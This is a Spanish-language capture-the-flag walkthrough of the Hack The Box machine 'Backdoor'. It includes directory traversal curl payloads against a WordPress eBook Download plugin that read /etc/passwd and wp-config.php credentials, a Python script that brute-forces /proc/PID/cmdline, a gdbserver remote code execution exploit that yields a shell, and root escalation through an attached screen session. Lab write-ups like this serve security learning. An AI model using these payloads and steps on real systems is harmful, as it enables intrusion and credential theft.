PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste

-Añadimos 'backdoor.htb' al /etc/hosts

-Estamos ante un Wordpress, tiramos un wpscan y encontramos el siguiente plugin vulnerable:
	-WordPress Plugin eBook Download 1.1 - Directory Traversal

-La ruta vulnerable es la siguiente:
	-http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/passwd

-Lo hacemos desde curl, ya que desde la URL nos descarga el archivo:
	-curl -s -X GET 'backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/passwd'

-Podemos leer el wp-config.php, el cual nos puede servir más tarde:
	-curl -s -X GET 'backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php'
		/** MySQL database username */
		define( 'DB_USER', 'wordpressuser' );
		
		/** MySQL database password */
		define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

-Probamos a enumerar logs, abusar de /proc/sef/environ , /proc/self/fd/x , SIN ÉXITO

-Vamos a enumerar la ruta **/proc/PYD/cmdline**, para ello, vamos a crear un script en Python que haga fuerza bruta en el parámetro --> PYD y nos encuentre algo interesante:
	#!/usr/bin/python3

	from pwn import *
	import requests, signal, time, sys
	
	def def_handler(sig, frame):
	        print("\n\n[!] Saliendo...\n")
	        sys.exit(1)
	
	#Ctrl + C
	signal.signal(signal.SIGINT, def_handler) # Hace que el flujo vaya a la función def_handler
	
	#Variables Globales
	main_url = "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="
	
	def makeRequest():
	    
	    # /proc/PID/cmdline
	
	    p1 = log.progress("Brute Force Attack")
	
	    time.sleep(1)
	
	    for i in range(1, 1000):
	        p1.status("Trying with PATH /proc/%s/cmdline" % str(i))
	        url = main_url + "/proc/" + str(i) + "/cmdline"
	        r = requests.get(url)
	
	        if len(r.content) > 82:
	            print("------------------------------------------------------")
	            log.info("PATH: /proc/%s/cmdline" % str(i))
	            log.info("Total length: %s" % len(r.content))
	            print(r.content)
	            print("------------------------------------------------------")
	
	if __name__ == '__main__':
	
	    makeRequest()

[▁] Brute Force Attack: Trying with PATH /proc/897/cmdline
[] Total length: 181
b'/proc/828/cmdline/bin/sh\x00-c\x00**while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;**"

-Hemos descubierto, a través del proceso **'/proc/828/cmdline'**, que en el puerto 1337 está corriendo un **servicio** llamado **'gdbserver'**

-Buscamos posibles exploits para el servicio 'gdbserver':
	-searchsploit gdbserver
		GNU gdbserver 9.2 - Remote Command Execution (RCE) 

-Aunque no sabemos la versión del servicio que está corriendo en la máquina, podemos probar con este exploit (RCE) , a ver si funciona:
	-python3 50539.py 10.10.11.125:1337 rev.bin
		user@Backdoor:/home/user$ whoami
			user

## Escalada de Privilegios


-Vemos los permisos SUID
	-Screen (Este no suele estar)

-Vemos los procesos que están corriendo en la máquina, filtrando por 'screen':
	-ps -faux | grep screen
		/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
			(Significa que está creando una sesión con screen llamada 'root')

-Podemos escalar a root con el siguiente comando:
	-screen -x root/
		root@Backdoor:~# whoami
		root    

